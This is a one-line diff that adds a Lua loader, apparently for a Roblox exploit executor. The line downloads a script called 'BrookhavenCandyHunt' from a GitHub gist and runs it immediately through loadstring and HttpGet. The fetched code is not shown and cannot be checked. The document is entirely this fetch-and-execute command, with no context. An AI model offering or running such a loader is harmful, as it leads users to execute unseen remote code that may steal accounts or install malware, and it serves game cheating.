@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/spiritualgaming1123-beep/df0780bde833ce4bc84d7cd99efe386e/raw/4288cb5f37cb89a5e4841cf5e4cb9992b0ec953b/BrookhavenCandyHunt"))()
